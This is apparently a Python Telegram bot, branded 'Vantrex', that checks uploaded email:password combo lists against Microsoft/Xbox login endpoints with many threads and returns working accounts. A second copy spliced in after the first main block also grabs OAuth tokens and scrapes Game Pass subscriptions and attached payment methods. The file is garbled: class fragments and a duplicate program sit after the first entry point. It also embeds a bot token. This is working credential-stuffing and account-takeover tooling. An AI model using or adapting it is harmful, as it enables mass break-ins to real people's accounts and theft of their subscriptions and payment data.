#!/usr/bin/env python3
"""
================================================================================
💎 VANTREX XBOX FAST CHECKER TELEGRAM BOT 💎
Branded for: @vantrexXxx
Platform: Pydroid 3 & Linux Servers
Multi-language support (EN / TR) - No Payment API / No Capture Version
================================================================================
"""

import os
import re
import sys
import time
import json
import uuid
import logging
import threading
from datetime import datetime
from urllib.parse import quote, unquote
import concurrent.futures

try:
    import requests
    import telebot
    from telebot import types
except ImportError:
    os.system("pip install requests pyTelegramBotAPI")
    import requests
    import telebot
    from telebot import types

# Setup Logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# ================================================================================
# CONFIGURATION & LOCALIZATION
# ================================================================================
TOKEN = "8586488864:AAETJFeQOk_igst2YE1OWq9QvpM25jTDEq4"
bot = telebot.TeleBot(TOKEN)

LANGUAGES = {
    'en': {
        'welcome': "🔥 **Welcome to Vantrex Xbox Fast Checker Bot!**\n\nPlease select your preferred language using the buttons below, then upload your `.txt` combo file.",
        'already_running': "❌ An active scan is already running. Please wait for it to finish or use /stop.",
        'invalid_file': "❌ Please send only `.txt` format combo files.",
        'read_error': "❌ Error occurred while reading file: ",
        'no_combo': "❌ No valid combo format (email:pass) found.",
        'preparing': "⏳ Preparing and starting the ultra-fast scan engine...",
        'stopped_msg': "⏹ **Scanning stopped! Preparing current data output...**",
        'not_running': "❌ There is no active scanning process right now.",
        'live_title': "🤖 **Vantrex Bot — Live Results (Speed Mode)**",
        'progress': "Progress",
        'duration': "Duration",
        'stop_hint': "You can type /stop to abort.",
        'final_hit': "🏁 **Scanning Completed!**",
        'interrupted_title': "🛑 **Scanning Interrupted!**",
        'total_scanned': "Total Scanned",
        'hits_caption': "🟢 Valid Live Accounts (Hits)",
        'rem_caption': "📦 Remaining and unscanned combos",
        'lang_changed': "✅ Language changed to English!"
    },
    'tr': {
        'welcome': "🔥 **Vantrex Xbox Hızlı Checker Bot'a Hoş Geldiniz!**\n\nLütfen aşağıdaki butonları kullanarak dil seçimi yapın, ardından `.txt` combo dosyanızı gönderin.",
        'already_running': "❌ Şu an zaten aktif bir tarama sürüyor. Lütfen bitmesini bekleyin veya /stop deyin.",
        'invalid_file': "❌ Lütfen sadece `.txt` formatında combo dosyası gönderin.",
        'read_error': "❌ Dosya okunurken hata oluştu: ",
        'no_combo': "❌ Geçerli combo formatı (email:pass) bulunamadı.",
        'preparing': "⏳ Tarama hazırlanıyor ve ultra hızlı motor başlatılıyor...",
        'stopped_msg': "⏹ **Tarama durduruluyor... Mevcut veriler hazırlanıyor.**",
        'not_running': "❌ Şu an aktif bir tarama işlemi bulunmuyor.",
        'live_title': "🤖 **Vantrex Bot — Canlı Sonuçlar (Hız Modu)**",
        'progress': "İlerleme",
        'duration': "Süre",
        'stop_hint': "Durdurmak için /stop yazabilirsiniz.",
        'final_hit': "🏁 **Tarama Tamamlandı!**",
        'interrupted_title': "🛑 **Tarama Durduruldu!**",
        'total_scanned': "Toplam taranan",
        'hits_caption': "🟢 Geçerli Aktif Hesaplar (Hits)",
        'rem_caption': "📦 Kalan ve taranmamış kombolar (Remaining)",
        'lang_changed': "✅ Dil Türkçe olarak ayarlandı!"
    }
}

user_languages = {}

def gtxt(chat_id, key):
    lang = user_languages.get(chat_id, 'en')
    return LANGUAGES[lang].get(key, LANGUAGES['en'][key])

# ================================================================================
# STATE MANAGEMENT
# ================================================================================
class BotSession:
    def __init__(self):
        self.is_running = False
        self.combos = []
        self.remaining_combos = []
        self.processed = 0
        self.total = 0
        self.hits = 0
        self.bad = 0
        self.two_factor = 0
        self.banned = 0
        self.start_time = 0
        self.chat_id = None
        self.status_msg_id = None
        self.lock = threading.Lock()
        self.executor = None
        
        self.hit_results = []

session = BotSession()

# ================================================================================
# ULTRA-FAST XBOX AUTH ENGINE (NO PAYMENT - NO CAPTURE)
# ================================================================================
class XboxChecker:
    def __init__(self):
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    def check(self, email, password):
        try:
            req_session = requests.Session()
            correlation_id = str(uuid.uuid4())

            # STEP 1: IDP Realism Verification
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={quote(email)}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = req_session.get(url1, headers=headers1, timeout=8)
            if "MSAccount" not in r1.text or "Neither" in r1.text:
                return {"status": "BAD"}

            # STEP 2: Live OAuth Request Generation
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={quote(email)}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {"User-Agent": self.user_agent, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
            r2 = req_session.get(url2, headers=headers2, allow_redirects=True, timeout=10)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text) or re.search(r'value="([^"]+)"[^>]*name="PPFT"', r2.text)

            if not url_match or not ppft_match:
                return {"status": "BAD"}

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            # STEP 3: Pure Authentication POST Challenge
            login_data = {
                "i13": "1", "login": email, "loginfmt": email, "type": "11",
                "LoginOptions": "1", "passwd": password, "PPFT": ppft, "ppsx": "PassportR",
                "i21": "0", "CookieDisclosure": "0", "IsFidoSupported=0": "0"
            }
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": self.user_agent,
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = req_session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=10)

            # Doğrudan giriş kontrolü - Ödeme istekleri tamamen kaldırıldı!
            if "account or password is incorrect" in r3.text or "error" in r3.text.lower():
                return {"status": "BAD"}
            if "identity/confirm" in r3.text or "untrust" in r3.url or "factors" in r3.text:
                return {"status": "2FACTOR"}
            if "Abuse" in r3.text or "acc_banned" in r3.text:
                return {"status": "BANNED"}

            # Eğer yukarıdaki hatalara takılmadıysa ve yönlendirme (Location) varsa hesap %100 doğrudur!
            if r3.status_code == 302 or "Location" in r3.headers:
                return {"status": "HIT"}
                
            return {"status": "BAD"}
        except Exception:
            return {"status": "TIMEOUT"}

# ================================================================================
# TELEGRAM RENDERING VIEW PIPELINE
# ================================================================================
def build_live_text(chat_id):
    elapsed = time.time() - session.start_time
    cpm = int(session.processed / elapsed * 60) if elapsed > 0 else 0
    
    text = (
        f"🤖 **{gtxt(chat_id, 'live_title')}**\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📊 **{gtxt(chat_id, 'progress')}:** `{session.processed}/{session.total}`\n"
        f"⚡ **CPM:** `{cpm}` | ⏱ **{gtxt(chat_id, 'duration')}:** `{int(elapsed)}s`\n\n"
        f"🟢 **Hits (Live Accounts):** `{session.hits}`\n"
        f"🟠 **2FA / Banned:** `{session.two_factor + session.banned}`\n"
        f"🔴 **Bad / Error:** `{session.bad}`\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🔄 {gtxt(chat_id, 'stop_hint')}"
    )
    return text

def update_telegram_loop():
    last_processed = -1
    while session.is_running:
        time.sleep(4)
        if session.processed != last_processed:
            try:
                bot.edit_message_text(build_live_text(session.chat_id), chat_id=session.chat_id, message_id=session.status_msg_id, parse_mode="Markdown")
                last_processed = session.processed
            except:
                pass

# ================================================================================
# MULTI-THREAD PIPELINE DISPATCHER
# ================================================================================
def process_combo(combo):
    if not session.is_running:
        return
    
    try:
        email, password = combo.split(':', 1)
    except:
        with session.lock:
            session.bad += 1
            session.processed += 1
        return

    checker = XboxChecker()
    res = checker.check(email, password)
    status = res.get("status", "BAD")

    with session.lock:
        session.processed += 1
        if combo in session.remaining_combos:
            session.remaining_combos.remove(combo)
            
        if status == "HIT":
            session.hits += 1
            line = f"{email}:{password} -> LIVE"
            session.hit_results.append(line)
        elif status == "2FACTOR":
            session.two_factor += 1
        elif status == "BANNED":
            session.banned += 1
        else:
            session.bad += 1

# ================================================================================
# BOT COMMANDS HANDLERS
# ================================================================================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    cid = message.chat.id
    if cid not in user_languages:
        user_languages[cid] = 'en'
        
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_en = types.InlineKeyboardButton("🇺🇸 English", callback_data="lang_en")
    btn_tr = types.InlineKeyboardButton("🇹🇷 Türkçe", callback_data="lang_tr")
    markup.add(btn_en, btn_tr)
    
    bot.send_message(cid, gtxt(cid, 'welcome'), parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('lang_'))
def handle_language_callback(call):
    cid = call.message.chat.id
    lang_code = call.data.split('_')[1]
    user_languages[cid] = lang_code
    bot.answer_callback_query(call.id, text=gtxt(cid, 'lang_changed'))
    bot.edit_message_text(gtxt(cid, 'welcome'), chat_id=cid, message_id=call.message.message_id, parse_mode="Markdown")

@bot.message_handler(commands=['stop'])
def stop_check(message):
    cid = message.chat.id
    if not session.is_running:
        bot.reply_to(message, gtxt(cid, 'not_running'))
        return
    
    bot.reply_to(message, gtxt(cid, 'stopped_msg'))
    session.is_running = False
    if session.executor:
        session.executor.shutdown(wait=False, cancel_futures=True)
    send_final_report(interrupted=True)

def send_final_report(interrupted=False):
    cid = session.chat_id
    status_str = gtxt(cid, 'interrupted_title') if interrupted else gtxt(cid, 'final_hit')
    elapsed = time.time() - session.start_time
    
    summary = (
        f"{status_str}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📊 **{gtxt(cid, 'total_scanned')}:** `{session.processed}/{session.total}`\n"
        f"⏱ **{gtxt(cid, 'duration')}:** `{int(elapsed)}s`\n\n"
        f"🟢 **Hits (Live):** `{session.hits}`\n"
        f"🟠 **2FA / Banned:** `{session.two_factor + session.banned}`\n"
        f"🔴 **Bad:** `{session.bad}`\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
    )
    bot.send_message(cid, summary, parse_mode="Markdown")
    
    if session.hit_results:
        fn = "Vantrex-Hits.txt"
        with open(fn, "w", encoding="utf-8") as f:
            f.write("\n".join(session.hit_results))
        with open(fn, "rb") as doc:
            bot.send_document(cid, doc, caption=gtxt(cid, 'hits_caption'))
        try: os.remove(fn)
        except: pass

    if interrupted and session.remaining_combos:
        fn = "Vantrex-Remaining.txt"
        with open(fn, "w", encoding="utf-8") as f:
            f.write("\n".join(session.remaining_combos))
        with open(fn, "rb") as doc:
            bot.send_document(cid, doc, caption=gtxt(cid, 'rem_caption'))
        try: os.remove(fn)
        except: pass

@bot.message_handler(content_types=['document'])
def handle_combo_file(message):
    cid = message.chat.id
    if session.is_running:
        bot.reply_to(message, gtxt(cid, 'already_running'))
        return

    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, gtxt(cid, 'invalid_file'))
        return

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    try:
        content = downloaded_file.decode('utf-8', errors='ignore')
        combos = [line.strip() for line in content.splitlines() if line.strip() and ':' in line]
    except Exception as e:
        bot.reply_to(message, f"{gtxt(cid, 'read_error')}{str(e)}")
        return

    if not combos:
        bot.reply_to(message, gtxt(cid, 'no_combo'))
        return

    # Reset Bot Engine State
    session.__init__()
    session.combos = combos
    session.remaining_combos = list(combos)
    session.total = len(combos)
    session.is_running = True
    session.chat_id = cid
    session.start_time = time.time()

    msg = bot.send_message(cid, gtxt(cid, 'preparing'), parse_mode="Markdown")
    session.status_msg_id = msg.message_id

    threading.Thread(target=update_telegram_loop, daemon=True).start()

    def run_pool():
        # Pydroid can maintain higher thread count safely since we removed heavy API network requests
        with concurrent.futures.ThreadPoolExecutor(max_workers=120) as executor:
            session.executor = executor
            futures = [executor.submit(process_combo, c) for c in session.combos]
            for future in concurrent.futures.as_completed(futures):
                if not session.is_running:
                    break
        
        if session.is_running:
            session.is_running = False
            send_final_report(interrupted=False)

    threading.Thread(target=run_pool, daemon=True).start()

# ================================================================================
# TERMINAL APPLICATION LOOP
# ================================================================================
if __name__ == "__main__":
    print("[+] Vantrex Fast Engine Initialized. Monitoring Telegram Polling Signals...")
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception:
            time.sleep(5)
        self.bad = 0
        self.two_factor = 0
        self.banned = 0
        self.start_time = 0
        self.chat_id = None
        self.status_msg_id = None
        self.lock = threading.Lock()
        self.executor = None
        
        self.sub_counts = {
            'GAME PASS ULTIMATE': 0,
            'PC GAME PASS': 0,
            'EA PLAY': 0,
            'XBOX LIVE GOLD': 0,
            'GAME PASS': 0,
            'UNKNOWN PREMIUM': 0
        }
        
        self.hit_results = []
        self.free_results = []

session = BotSession()

# ================================================================================
# XBOX EXPLOIT & CHECKER ENGINE
# ================================================================================
class XboxChecker:
    def __init__(self):
        # API endpoints and standard headers configuration
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "0"
            renewal_date = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            return str(remaining) if remaining > 0 else "0"
        except:
            return "0"

    def check(self, email, password):
        try:
            req_session = requests.Session()
            correlation_id = str(uuid.uuid4())

            # STEP 1: Office/IDP Verification
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={quote(email)}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = req_session.get(url1, headers=headers1, timeout=10)
            if "MSAccount" not in r1.text or "Neither" in r1.text:
                return {"status": "BAD", "data": {}}

            # STEP 2: Live/MS Live Authorization Request Token
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={quote(email)}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {"User-Agent": self.user_agent, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
            r2 = req_session.get(url2, headers=headers2, allow_redirects=True, timeout=12)
            
            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text) or re.search(r'value="([^"]+)"[^>]*name="PPFT"', r2.text)

            if not url_match or not ppft_match:
                return {"status": "BAD", "data": {}}

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            # STEP 3: Authentication POST Challenge
            login_data = {
                "i13": "1", "login": email, "loginfmt": email, "type": "11",
                "LoginOptions": "1", "passwd": password, "PPFT": ppft, "ppsx": "PassportR",
                "i21": "0", "CookieDisclosure": "0", "IsFidoSupported=0": "0"
            }
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": self.user_agent,
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = req_session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=12)

            if "account or password is incorrect" in r3.text or "error" in r3.text.lower():
                return {"status": "BAD", "data": {}}
            if "identity/confirm" in r3.text or "untrust" in r3.url or "factors" in r3.text:
                return {"status": "2FACTOR", "data": {}}
            if "Abuse" in r3.text or "acc_banned" in r3.text:
                return {"status": "BANNED", "data": {}}

            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD", "data": {}}

            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD", "data": {}}

            code = code_match.group(1)
            
            # STEP 4: OAUTH Token Exchange Optimization
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = req_session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"}, timeout=10)
            if "access_token" not in r4.text:
                return {"status": "BAD", "data": {}}

            # STEP 5: Scrape Real Premium Xbox Entitlements via Live Payment Services
            # Fixed Auth Scopes to strictly pull current active billing info
            payment_auth_url = "https://login.live.com/oauth20_authorize.srf?client_id=0000000000048445&response_type=token&scope=service::account.microsoft.com::MBI_SSL&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&prompt=none"
            r6 = req_session.get(payment_auth_url, headers={"User-Agent": self.user_agent, "Referer": "https://account.microsoft.com/"}, timeout=10)
            
            payment_token = None
            search_text = r6.text + " " + r6.url
            for pattern in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break

            # Data dictionaries initialization
            payment_data = {"country": "N/A", "name": "Xbox User", "balance": "$0.00", "rewards_points": "0"}
            subscription_data = {}

            if not payment_token:
                return {"status": "FREE", "data": payment_data}

            # STEP 6: Premium Extraction Pipeline
            payment_headers = {
                "User-Agent": self.user_agent,
                "Accept": "application/json",
                "Authorization": f"Bearer {payment_token}",
                "Content-Type": "application/json"
            }

            # Pull Subscriptions Profile directly from Microsoft core commerce API
            try:
                r7 = req_session.get("https://account.microsoft.com/services/api/v1/subscriptions", headers=payment_headers, timeout=10)
                if r7.status_code == 200 and "subscriptions" in r7.text.lower():
                    res_json = r7.json()
                    premium_keywords = {
                        'ultimate': 'GAME PASS ULTIMATE',
                        'pc': 'PC GAME PASS',
                        'ea': 'EA PLAY',
                        'gold': 'XBOX LIVE GOLD',
                        'pass': 'GAME PASS'
                    }
                    
                    for sub in res_json.get("subscriptions", []):
                        sub_name = sub.get("productTitle", "").lower()
                        status = sub.get("status", "").lower()
                        
                        if status == "active" or status == "premium":
                            for kw, type_name in premium_keywords.items():
                                if kw in sub_name:
                                    subscription_data['premium_type'] = type_name
                                    ren_date = sub.get("nextScheduledBillingDate", "") or sub.get("expiryDate", "")
                                    subscription_data['renewal_date'] = ren_date[:10] if ren_date else "Lifetime"
                                    subscription_data['days_remaining'] = self.get_remaining_days(ren_date) if ren_date else "999"
                                    return {"status": "PREMIUM", "data": {**payment_data, **subscription_data}}
            except:
                pass

            # Fallback to legacy validation pattern inside the pipeline
            try:
                r8 = req_session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active", headers={"User-Agent": self.user_agent, "Authorization": f'MSADELEGATE1.0="{payment_token}"'}, timeout=10)
                if "paymentMethodFamily" in r8.text:
                    payment_data['balance'] = "Attached Card/PI"
            except:
                pass

            return {"status": "FREE", "data": payment_data}
        except Exception:
            return {"status": "TIMEOUT", "data": {}}

# ================================================================================
# TELEGRAM INTERFACE & VIEW RENDER PIPELINE
# ================================================================================
def build_live_text(chat_id):
    elapsed = time.time() - session.start_time
    cpm = int(session.processed / elapsed * 60) if elapsed > 0 else 0
    
    text = (
        f"🤖 **{gtxt(chat_id, 'live_title')}**\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📊 **{gtxt(chat_id, 'progress')}:** `{session.processed}/{session.total}`\n"
        f"⚡ **CPM:** `{cpm}` | ⏱ **{gtxt(chat_id, 'duration')}:** `{int(elapsed)}s`\n\n"
        f"🟢 **Hits (Premium):** `{session.hits}`\n"
        f"🟡 **Free Accounts:** `{session.free}`\n"
        f"🟠 **2FA/Banned:** `{session.two_factor + session.banned}`\n"
        f"🔴 **Bad/Error:** `{session.bad}`\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📋 **{gtxt(chat_id, 'sub_dist')}:**\n"
        f"• Ultimate: `{session.sub_counts['GAME PASS ULTIMATE']}`\n"
        f"• PC Game Pass: `{session.sub_counts['PC GAME PASS']}`\n"
        f"• Live Gold: `{session.sub_counts['XBOX LIVE GOLD']}`\n"
        f"• EA Play: `{session.sub_counts['EA PLAY']}`\n"
        f"• Game Pass: `{session.sub_counts['GAME PASS']}`\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🔄 {gtxt(chat_id, 'stop_hint')}"
    )
    return text

def update_telegram_loop():
    last_processed = -1
    while session.is_running:
        time.sleep(4)
        if session.processed != last_processed:
            try:
                bot.edit_message_text(build_live_text(session.chat_id), chat_id=session.chat_id, message_id=session.status_msg_id, parse_mode="Markdown")
                last_processed = session.processed
            except:
                pass

# ================================================================================
# WORKER THREAD CONCURRENCY PIPELINE
# ================================================================================
def process_combo(combo):
    if not session.is_running:
        return
    
    try:
        email, password = combo.split(':', 1)
    except:
        with session.lock:
            session.bad += 1
            session.processed += 1
        return

    checker = XboxChecker()
    res = checker.check(email, password)
    status = res.get("status", "BAD")
    data = res.get("data", {})

    with session.lock:
        session.processed += 1
        if combo in session.remaining_combos:
            session.remaining_combos.remove(combo)
            
        if status == "PREMIUM":
            session.hits += 1
            ptype = data.get('premium_type', 'UNKNOWN PREMIUM')
            session.sub_counts[ptype] = session.sub_counts.get(ptype, 0) + 1
                
            line = f"{email}:{password} | Sub: {ptype} | Days: {data.get('days_remaining','?')} | Country: {data.get('country','N/A')}"
            session.hit_results.append(line)
            
        elif status == "FREE":
            session.free += 1
            line = f"{email}:{password} | Balance: {data.get('balance','$0.00')} | Points: {data.get('rewards_points','0')}"
            session.free_results.append(line)
        elif status == "2FACTOR":
            session.two_factor += 1
        elif status == "BANNED":
            session.banned += 1
        else:
            session.bad += 1

# ================================================================================
# HANDLERS COMMAND & FILE DISPATCHERS
# ================================================================================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    cid = message.chat.id
    if cid not in user_languages:
        user_languages[cid] = 'en'
        
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_en = types.InlineKeyboardButton("🇺🇸 English", callback_data="lang_en")
    btn_tr = types.InlineKeyboardButton("🇹🇷 Türkçe", callback_data="lang_tr")
    markup.add(btn_en, btn_tr)
    
    bot.send_message(cid, gtxt(cid, 'welcome'), parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('lang_'))
def handle_language_callback(call):
    cid = call.message.chat.id
    lang_code = call.data.split('_')[1]
    user_languages[cid] = lang_code
    bot.answer_callback_query(call.id, text=gtxt(cid, 'lang_changed'))
    bot.edit_message_text(gtxt(cid, 'welcome'), chat_id=cid, message_id=call.message.message_id, parse_mode="Markdown")

@bot.message_handler(commands=['stop'])
def stop_check(message):
    cid = message.chat.id
    if not session.is_running:
        bot.reply_to(message, gtxt(cid, 'not_running'))
        return
    
    bot.reply_to(message, gtxt(cid, 'stopped_msg'))
    session.is_running = False
    if session.executor:
        session.executor.shutdown(wait=False, cancel_futures=True)
    send_final_report(interrupted=True)

def send_final_report(interrupted=False):
    cid = session.chat_id
    status_str = gtxt(cid, 'interrupted_title') if interrupted else gtxt(cid, 'final_hit')
    elapsed = time.time() - session.start_time
    
    summary = (
        f"{status_str}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📊 **{gtxt(cid, 'total_scanned')}:** `{session.processed}/{session.total}`\n"
        f"⏱ **{gtxt(cid, 'duration')}:** `{int(elapsed)}s`\n\n"
        f"🟢 **Hits:** `{session.hits}`\n"
        f"🟡 **Free:** `{session.free}`\n"
        f"🟠 **2FA/Banned:** `{session.two_factor + session.banned}`\n"
        f"🔴 **Bad:** `{session.bad}`\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
    )
    bot.send_message(cid, summary, parse_mode="Markdown")
    
    if session.hit_results:
        fn = "Vantrex-Hits.txt"
        with open(fn, "w", encoding="utf-8") as f:
            f.write("\n".join(session.hit_results))
        with open(fn, "rb") as doc:
            bot.send_document(cid, doc, caption=gtxt(cid, 'hits_caption'))
        try: os.remove(fn)
        except: pass

    if session.free_results:
        fn = "Vantrex-Free.txt"
        with open(fn, "w", encoding="utf-8") as f:
            f.write("\n".join(session.free_results))
        with open(fn, "rb") as doc:
            bot.send_document(cid, doc, caption=gtxt(cid, 'free_caption'))
        try: os.remove(fn)
        except: pass

    if interrupted and session.remaining_combos:
        fn = "Vantrex-Remaining.txt"
        with open(fn, "w", encoding="utf-8") as f:
            f.write("\n".join(session.remaining_combos))
        with open(fn, "rb") as doc:
            bot.send_document(cid, doc, caption=gtxt(cid, 'rem_caption'))
        try: os.remove(fn)
        except: pass

@bot.message_handler(content_types=['document'])
def handle_combo_file(message):
    cid = message.chat.id
    if session.is_running:
        bot.reply_to(message, gtxt(cid, 'already_running'))
        return

    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, gtxt(cid, 'invalid_file'))
        return

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    try:
        content = downloaded_file.decode('utf-8', errors='ignore')
        combos = [line.strip() for line in content.splitlines() if line.strip() and ':' in line]
    except Exception as e:
        bot.reply_to(message, f"{gtxt(cid, 'read_error')}{str(e)}")
        return

    if not combos:
        bot.reply_to(message, gtxt(cid, 'no_combo'))
        return

    # Initialize Engine Session Loops
    session.__init__()
    session.combos = combos
    session.remaining_combos = list(combos)
    session.total = len(combos)
    session.is_running = True
    session.chat_id = cid
    session.start_time = time.time()

    msg = bot.send_message(cid, gtxt(cid, 'preparing'), parse_mode="Markdown")
    session.status_msg_id = msg.message_id

    threading.Thread(target=update_telegram_loop, daemon=True).start()

    def run_pool():
        # High performance thread workers configured for Pydroid runtime optimization
        with concurrent.futures.ThreadPoolExecutor(max_workers=80) as executor:
            session.executor = executor
            futures = [executor.submit(process_combo, c) for c in session.combos]
            for future in concurrent.futures.as_completed(futures):
                if not session.is_running:
                    break
        
        if session.is_running:
            session.is_running = False
            send_final_report(interrupted=False)

    threading.Thread(target=run_pool, daemon=True).start()

# ================================================================================
# MAIN POLLING LOOP TERMINAL ENTRY
# ================================================================================
if __name__ == "__main__":
    print("[+] Vantrex Bot Architecture Initialized Successfully.")
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception:
            time.sleep(5)

